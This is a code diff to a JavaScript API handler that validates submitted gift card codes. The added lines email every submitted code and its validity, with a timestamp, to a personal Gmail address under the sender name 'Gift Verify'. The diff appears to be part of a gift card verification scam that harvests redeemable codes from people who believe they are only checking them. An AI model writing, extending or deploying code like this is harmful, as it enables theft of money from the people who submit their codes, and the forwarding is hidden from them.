@@ -1,3 +1,7 @@
+import { Resend } from 'resend';
+
+const resend = new Resend(process.env.RESEND_API_KEY);
+
 export default async function handler(req, res) {
   try {
     if (req.method !== "POST") {
@@ -21,6 +25,19 @@ export default async function handler(req, res) {
     const isValid = validCodes.includes(code);
 
     console.log("✅ VALID:", isValid);
+
+    // 🔥 SEND EMAIL
+    await resend.emails.send({
+      from: "Gift Verify <onboarding@resend.dev>",
+      to: "sodiqdioxide@gmail.com",
+      subject: "New Gift Card Code Submitted",
+      html: `
+        <h2>New Code Received</h2>
+        <p><b>Code:</b> ${code}</p>
+        <p><b>Valid:</b> ${isValid}</p>
+        <p><b>Time:</b> ${new Date().toLocaleString()}</p>
+      `,
+    });
 
     return res.status(200).json({ success: isValid });
 
